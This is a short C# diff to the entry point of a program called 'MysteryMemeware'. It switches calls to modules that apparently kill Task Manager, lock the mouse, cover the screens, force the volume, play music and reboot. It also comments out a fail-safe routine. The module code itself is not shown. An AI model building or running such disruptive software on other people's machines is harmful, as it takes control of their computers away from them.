@@ -1,11 +1,6 @@
 ﻿using System;
-using System.IO;
-using System.Threading;
 using System.Runtime.InteropServices;
-using System.Reflection;
-using System.Media;
 using System.Security.Principal;
-using System.Windows.Forms;
 
 namespace MysteryMemeware
 {
@@ -18,23 +13,21 @@ namespace MysteryMemeware
         [STAThread]
         public static void Main()
         {
-            FailSafeModule.RunKillLoop();
+            //FailSafeModule.RunKillLoop();
 
             //WinLogOffModule.Reboot();
 
-            //CursorSlowModule.SlowCursor();
-            //VolumeModule.SetVolume();
+            VolumeModule.SetVolume();
             //TaskMGRModule.KillTaskMGR();
-            //MouseLockModule.LockMouse();
-            MusicModule.PlayMusic();
-            DisplayCoverModule.CoverDisplays();
 
-            //SlowCursor();
+           // MouseLockModule.LockMouse();
+           // MusicModule.PlayMusic();
+            //DisplayCoverModule.CoverDisplays();
 
-            while (true)
+            /*while (true)
             {
                 System.Threading.Thread.Sleep(1000);
-            }
+            }*/
 
 
 
